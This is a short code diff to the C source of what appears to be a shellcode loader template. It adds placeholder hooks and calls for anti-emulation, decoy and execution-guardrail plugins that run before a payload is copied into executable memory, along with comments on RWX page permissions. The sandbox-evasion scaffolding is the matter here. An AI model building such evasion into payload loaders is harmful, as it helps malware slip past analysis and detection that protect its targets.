@@ -15,10 +15,28 @@ char *supermega_payload;
    * does (rw/rx) -> rwx -> rx
 */
 
+{{plugin_antiemulation}}
+
+{{plugin_decoy}}
+
+{{plugin_executionguardrail}}
+
+
 int main()
 {
     DWORD result;
     char *dest = supermega_payload;
+
+	// Call: Execution Guardrail
+	if (executionguardrail() != 0) {
+		return 1;
+	}
+
+	// Call: Anti Emulation plugin
+	antiemulation();
+
+	// Call: Decoy plugin
+	decoy();
 
     // Note: RWX if carrier and payload are on the same page (or we cant exec copy..)
     //       can do only RW otherwise?
